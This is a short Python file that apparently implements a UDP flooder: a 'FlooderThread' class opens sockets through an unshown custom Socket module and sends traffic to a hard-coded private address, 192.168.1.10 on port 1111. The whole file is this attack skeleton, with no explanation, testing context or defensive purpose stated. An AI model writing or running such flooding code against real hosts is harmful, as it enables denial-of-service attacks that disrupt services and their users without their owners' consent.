import threading
from Socket import Socket
import time

class FlooderThread(threading.Thread):
    def __init__(self, n_thread, target:str, port:int) -> None:
        threading.Thread.__init__(self)
        self.n_thread = n_thread
        self.target = target
        self.port = port

    
        
    def run(self):
        #self.socket._connect(self.target, self.port)
        for i in range(self.n_thread):
            s = Socket('udp',i)
            s._connect(self.target, self.port)
            s._send()
            #self.socket._send()
                



th = FlooderThread(10, '192.168.1.10', 1111)
th.start()
th.join()